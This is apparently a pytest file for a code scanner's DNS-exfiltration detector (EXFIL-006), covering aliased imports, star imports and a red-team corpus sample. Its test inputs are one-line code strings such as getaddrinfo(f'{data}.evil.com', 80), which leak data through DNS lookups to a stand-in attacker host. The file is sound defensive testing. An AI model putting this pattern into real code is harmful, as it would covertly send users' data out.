"""Tests for DNS exfil via getaddrinfo detector (EXFIL-006).

Covers _detect_dns_exfil in _ast_exfil_detector.py: detection of
socket.getaddrinfo() with non-literal hostnames (f-strings, variables,
concatenation), alias resolution, registration, and corpus validation.
"""

from __future__ import annotations

import ast
from pathlib import Path

from skill_scan.ast_analyzer import (
    _detect_dns_exfil,
    analyze_python,
)
from skill_scan.models import Severity

_FILE = "test.py"


# -- Direct detector tests ---------------------------------------------------


class TestDetectDnsExfil:
    """_detect_dns_exfil detects socket.getaddrinfo with non-literal hostname."""

    def test_fstring_hostname_produces_exfil006(self) -> None:
        """R004: getaddrinfo(f'{data}.evil.com', 80) triggers EXFIL-006."""
        code = "socket.getaddrinfo(f'{data}.evil.com', 80)"
        tree = ast.parse(code)
        node = next(n for n in ast.walk(tree) if isinstance(n, ast.Call))
        findings = _detect_dns_exfil(node, _FILE, alias_map={})
        assert len(findings) == 1
        assert findings[0].rule_id == "EXFIL-006"
        assert findings[0].severity == Severity.CRITICAL
        assert findings[0].category == "data-exfiltration"

    def test_variable_hostname_produces_exfil006(self) -> None:
        code = "socket.getaddrinfo(hostname, 80)"
        tree = ast.parse(code)
        node = next(n for n in ast.walk(tree) if isinstance(n, ast.Call))
        findings = _detect_dns_exfil(node, _FILE, alias_map={})
        assert len(findings) == 1
        assert findings[0].rule_id == "EXFIL-006"

    def test_concat_hostname_produces_exfil006(self) -> None:
        code = "socket.getaddrinfo(data + '.evil.com', 80)"
        tree = ast.parse(code)
        node = next(n for n in ast.walk(tree) if isinstance(n, ast.Call))
        findings = _detect_dns_exfil(node, _FILE, alias_map={})
        assert len(findings) == 1
        assert findings[0].rule_id == "EXFIL-006"

    def test_literal_hostname_no_finding(self) -> None:
        """Literal string hostname should NOT produce a finding."""
        code = "socket.getaddrinfo('literal.example.com', 80)"
        tree = ast.parse(code)
        node = next(n for n in ast.walk(tree) if isinstance(n, ast.Call))
        findings = _detect_dns_exfil(node, _FILE, alias_map={})
        assert findings == []

    def test_no_finding_for_non_getaddrinfo_call(self) -> None:
        code = "socket.connect(('evil.com', 80))"
        tree = ast.parse(code)
        node = next(n for n in ast.walk(tree) if isinstance(n, ast.Call))
        findings = _detect_dns_exfil(node, _FILE, alias_map={})
        assert findings == []

    def test_no_finding_for_non_call_node(self) -> None:
        tree = ast.parse("x = 1")
        node = next(n for n in ast.walk(tree) if isinstance(n, ast.Assign))
        findings = _detect_dns_exfil(node, _FILE, alias_map={})
        assert findings == []


# -- Alias resolution tests -------------------------------------------------


class TestDnsExfilAliasResolution:
    """_detect_dns_exfil resolves aliased socket import via alias_map."""

    def test_aliased_socket_detected(self) -> None:
        code = "s.getaddrinfo(f'{data}.evil.com', 80)"
        alias_map = {"s": "socket"}
        tree = ast.parse(code)
        node = next(n for n in ast.walk(tree) if isinstance(n, ast.Call))
        findings = _detect_dns_exfil(node, _FILE, alias_map=alias_map)
        assert len(findings) == 1
        assert findings[0].rule_id == "EXFIL-006"

    def test_bare_getaddrinfo_from_star_import(self) -> None:
        """Bare getaddrinfo() with alias_map mapping it to socket.getaddrinfo."""
        code = "getaddrinfo(f'{data}.evil.com', 80)"
        alias_map = {"getaddrinfo": "socket.getaddrinfo"}
        tree = ast.parse(code)
        node = next(n for n in ast.walk(tree) if isinstance(n, ast.Call))
        findings = _detect_dns_exfil(node, _FILE, alias_map=alias_map)
        assert len(findings) == 1
        assert findings[0].rule_id == "EXFIL-006"

    def test_no_alias_map_still_works(self) -> None:
        code = "socket.getaddrinfo(f'{data}.evil.com', 80)"
        tree = ast.parse(code)
        node = next(n for n in ast.walk(tree) if isinstance(n, ast.Call))
        findings = _detect_dns_exfil(node, _FILE, alias_map=None)
        assert len(findings) == 1


# -- Registration tests -----------------------------------------------------


class TestDnsExfilRegistration:
    """_detect_dns_exfil is registered in _DETECTORS and re-exported."""

    def test_dns_exfil_in_detectors_tuple(self) -> None:
        from skill_scan.ast_analyzer import _DETECTORS

        detector_names = [d.__name__ for d in _DETECTORS]
        assert "_detect_dns_exfil" in detector_names

    def test_dns_exfil_reexported_from_facade(self) -> None:
        from skill_scan import ast_analyzer

        assert hasattr(ast_analyzer, "_detect_dns_exfil")


# -- Integration via analyze_python -----------------------------------------


class TestDnsExfilIntegration:
    """Full pipeline integration through analyze_python."""

    def test_getaddrinfo_fstring_detected_via_analyze(self) -> None:
        code = "import socket\nsocket.getaddrinfo(f'{data}.evil.com', 80)\n"
        findings = analyze_python(code, _FILE)
        exfil = [f for f in findings if f.rule_id == "EXFIL-006"]
        assert len(exfil) == 1
        assert exfil[0].category == "data-exfiltration"

    def test_aliased_socket_detected_via_analyze(self) -> None:
        code = "import socket as s\ns.getaddrinfo(f'{chunk}.evil.com', 80)\n"
        findings = analyze_python(code, _FILE)
        exfil = [f for f in findings if f.rule_id == "EXFIL-006"]
        assert len(exfil) == 1

    def test_literal_hostname_no_finding_via_analyze(self) -> None:
        code = "import socket\nsocket.getaddrinfo('localhost', 80)\n"
        findings = analyze_python(code, _FILE)
        exfil = [f for f in findings if f.rule_id == "EXFIL-006"]
        assert exfil == []

    def test_star_import_socket_detected_via_analyze(self) -> None:
        """from socket import * then bare getaddrinfo() triggers EXFIL-006."""
        code = "from socket import *\ngetaddrinfo(f'{data}.evil.com', 80)\n"
        findings = analyze_python(code, _FILE)
        exfil = [f for f in findings if f.rule_id == "EXFIL-006"]
        assert len(exfil) == 1


# -- Corpus validation ------------------------------------------------------


class TestCorpusDnsExfil:
    """Corpus exfil_dns_txt.py produces EXFIL-006 finding."""

    _CORPUS_PATH = (
        Path(__file__).resolve().parents[2]
        / "corpus"
        / "red-team"
        / "2026-03-17-full"
        / "exfil-obfs-evasion"
        / "exfil_dns_txt.py"
    )

    def test_corpus_dns_exfil_produces_exfil006(self) -> None:
        assert self._CORPUS_PATH.exists(), f"Corpus file not found: {self._CORPUS_PATH}"
        content = self._CORPUS_PATH.read_text(encoding="utf-8")
        findings = analyze_python(content, str(self._CORPUS_PATH))
        exfil = [f for f in findings if f.rule_id == "EXFIL-006"]
        assert len(exfil) >= 1, f"Expected EXFIL-006 finding, got: {[f.rule_id for f in findings]}"
